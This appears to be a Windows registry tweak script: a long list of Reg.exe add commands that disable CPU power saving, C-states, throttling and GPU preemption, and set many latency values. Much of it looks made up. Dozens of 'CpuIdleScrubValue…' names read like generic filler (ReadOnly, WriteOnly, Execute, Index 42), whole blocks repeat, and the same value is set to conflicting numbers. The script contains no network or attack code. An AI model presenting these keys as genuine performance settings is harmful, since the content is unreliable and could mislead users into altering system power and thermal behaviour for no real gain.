Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubType" /t REG_DWORD /d "2" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValue" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueMaximum" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueMinimum" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueStep" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueDefault" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueCurrent" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValuePrevious" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueNext" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueLast" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueFirst" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueCount" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueIndex" /t REG_DWORD /d "42" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueName" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueDescription" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueDisabled" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueVisible" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueHidden" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueReadOnly" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueReadWrite" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueWriteOnly" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueExecute" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueNoExecute" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueSystem" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueUser" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubPower" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueDisabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueDefaultEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueDefaultDisabled" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueDefaultAuto" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueDefaultManual" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubPower" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueCustom" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueAuto" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueManual" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueAutomatic" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueDisabledByDefault" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueEnabledByDefault" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueDefaultEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueDefaultDisabled" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueDefaultAuto" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueDefaultManual" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\943c8cb6-6f93-4227-ad87-e9a3feec08d1" /v "Attributes" /t REG_DWORD /d "2" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\2a737441-1930-4402-8d77-b2bebba308a3\d4e98f31-5ffe-4ce1-be31-1b38b384c009\DefaultPowerSchemeValues\381b4222-f694-41f0-9685-ff5bb260df2e" /v "ACSettingIndex" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\2a737441-1930-4402-8d77-b2bebba308a3\d4e98f31-5ffe-4ce1-be31-1b38b384c009\DefaultPowerSchemeValues\381b4222-f694-41f0-9685-ff5bb260df2e" /v "DCSettingIndex" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\2a737441-1930-4402-8d77-b2bebba308a3\d4e98f31-5ffe-4ce1-be31-1b38b384c009\DefaultPowerSchemeValues\8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c" /v "ACSettingIndex" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\3b04d4fd-1cc7-4f23-ab1c-d1337819c4bb\DefaultPowerSchemeValues\381b4222-f694-41f0-9685-ff5bb260df2e" /v "ACSettingIndex" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\3b04d4fd-1cc7-4f23-ab1c-d1337819c4bb\DefaultPowerSchemeValues\381b4222-f694-41f0-9685-ff5bb260df2e" /v "DCSettingIndex" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\3b04d4fd-1cc7-4f23-ab1c-d1337819c4bb\DefaultPowerSchemeValues\8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c" /v "ACSettingIndex" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Processor" /v "AllowPepPerfStates" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Processor" /v "Cstates" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Processor" /v "Capabilities" /t REG_DWORD /d "516198" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "HighPerformance" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "HighestPerformance" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "MinimumThrottlePercent" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "MaximumThrottlePercent" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "MaximumPerformancePercent" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "Class1InitialUnparkCount" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "InitialUnparkCount" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "MaximumPerformancePercent" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WcmSvc\GroupPolicy" /v "fDisablePowerManagement" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PDC\Activators\Default\VetoPolicy" /v "EA:EnergySaverEngaged" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PDC\Activators\28\VetoPolicy" /v "EA:PowerStateDischarging" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\Policy\Settings\Misc" /v "DeviceIdlePolicy" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\Policy\Settings\Processor" /v "PerfEnergyPreference" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\Policy\Settings\Processor" /v "PerfEnergyPreference" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\Policy\Settings\Processor" /v "CPMinCores" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\Policy\Settings\Processor" /v "CPMaxCores" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\Policy\Settings\Processor" /v "CPMinCores1" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\Policy\Settings\Processor" /v "CPMaxCores1" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\Policy\Settings\Processor" /v "CpLatencyHintUnpark1" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\Policy\Settings\Processor" /v "CPDistribution" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\Policy\Settings\Processor" /v "CpLatencyHintUnpark" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\Policy\Settings\Processor" /v "MaxPerformance1" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\Policy\Settings\Processor" /v "MaxPerformance" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\Policy\Settings\Processor" /v "CPDistribution1" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\Policy\Settings\Processor" /v "CPHEADROOM" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Control Panel\PowerCfg\GlobalPowerPolicy" /v "Policies" /t REG_BINARY /d "01000000020000000100000000000000020000000000000000000000000000002c0100003232030304000000040000000000000000000000840300002c01000000000000840300000001646464640000" /f
Reg.exe add "HKCU\Control Panel\PowerCfg\GlobalPowerPolicy" /v "Policies" /t REG_BINARY /d "01000000020000000100000000000000020000000000000000000000000000002c0100003232030304000000040000000000000000000000840300002c01000000000000840300000001646464640000" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Processor" /v "Cstates" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Processor" /v "Capabilities" /t REG_DWORD /d "516198" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "HighPerformance" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "HighestPerformance" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "MinimumThrottlePercent" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "MaximumThrottlePercent" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "MaximumPerformancePercent" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "Class1InitialUnparkCount" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "InitialUnparkCount" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "MaximumPerformancePercent" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerThrottling" /v "PowerThrottlingOff" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\Policy\Settings\Processor" /v "CPHEADROOM" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\Policy\Settings\Processor" /v "CPCONCURRENCY" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "ProccesorThrottlingEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleThreshold" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdle" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuLatencyTimer" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuSlowdown" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "DedicatedSegmentSize" /t REG_DWORD /d "1298" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "Threshold" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuDebuggingEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "ProccesorLatencyThrottlingEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubDelay" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubInterval" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubPower" /t REG_DWORD /d "18" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubThreshold" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubType" /t REG_DWORD /d "2" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValue" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueMaximum" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueMinimum" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueStep" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueDefault" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueCurrent" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValuePrevious" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueNext" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueLast" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueFirst" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueCount" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueIndex" /t REG_DWORD /d "42" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueName" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueDescription" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueDisabled" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueVisible" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueHidden" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueReadOnly" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueReadWrite" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueWriteOnly" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueExecute" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueNoExecute" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueSystem" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueUser" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubPower" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueDisabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueDefaultEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueDefaultDisabled" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueDefaultAuto" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueDefaultManual" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubPower" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueCustom" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueAuto" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueManual" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueAutomatic" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueDisabledByDefault" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueEnabledByDefault" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueDefaultEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueDefaultDisabled" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueDefaultAuto" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueDefaultManual" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Scheduler" /v "EnablePreemption" /t REG_DWORD /d "0" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Scheduler" /v "GPUPreemptionLevel" /t REG_DWORD /d "0" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Scheduler" /v "EnableAsyncMidBufferPreemption" /t REG_DWORD /d "0" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Scheduler" /v "EnableMidGfxPreemptionVGPU" /t REG_DWORD /d "0" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Scheduler" /v "EnableMidBufferPreemptionForHighTdrTimeout" /t REG_DWORD /d "0" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Scheduler" /v "EnableSCGMidBufferPreemption" /t REG_DWORD /d "0" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Scheduler" /v "PerfAnalyzeMidBufferPreemption" /t REG_DWORD /d "0" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Scheduler" /v "EnableMidGfxPreemption" /t REG_DWORD /d "0" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Scheduler" /v "EnableMidBufferPreemption" /t REG_DWORD /d "0" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Scheduler" /v "EnableCEPreemption" /t REG_DWORD /d "0" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Scheduler" /v "DisableCudaContextPreemption" /t REG_DWORD /d "0" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Scheduler" /v "DisablePreemptionOnS3S4" /t REG_DWORD /d "0" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Scheduler" /v "ComputePreemptionLevel" /t REG_DWORD /d "0" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Scheduler" /v "DisablePreemption" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\DXGKrnl" /v "MonitorLatencyTolerance" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\DXGKrnl" /v "MonitorRefreshLatencyTolerance" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "ExitLatency" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "ExitLatencyCheckEnabled" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "Latency" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "LatencyToleranceDefault" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "LatencyToleranceFSVP" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "LatencyTolerancePerfOverride" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "LatencyToleranceScreenOffIR" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "LatencyToleranceVSyncEnabled" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "RtlCapabilityCheckLatency" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultD3TransitionLatencyActivelyUsed" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultD3TransitionLatencyIdleLongTime" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultD3TransitionLatencyIdleMonitorOff" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultD3TransitionLatencyIdleNoContext" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultD3TransitionLatencyIdleShortTime" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultD3TransitionLatencyIdleVeryLongTime" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultLatencyToleranceIdle0" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultLatencyToleranceIdle0MonitorOff" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultLatencyToleranceIdle1" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultLatencyToleranceIdle1MonitorOff" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultLatencyToleranceMemory" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultLatencyToleranceNoContext" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultLatencyToleranceNoContextMonitorOff" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultLatencyToleranceOther" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultLatencyToleranceTimerPeriod" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultMemoryRefreshLatencyToleranceActivelyUsed" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultMemoryRefreshLatencyToleranceMonitorOff" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultMemoryRefreshLatencyToleranceNoContext" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "Latency" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "MaxIAverageGraphicsLatencyInOneBucket" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "MiracastPerfTrackGraphicsLatency" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "MonitorLatencyTolerance" /t REG_DWORD /d "1" /f 
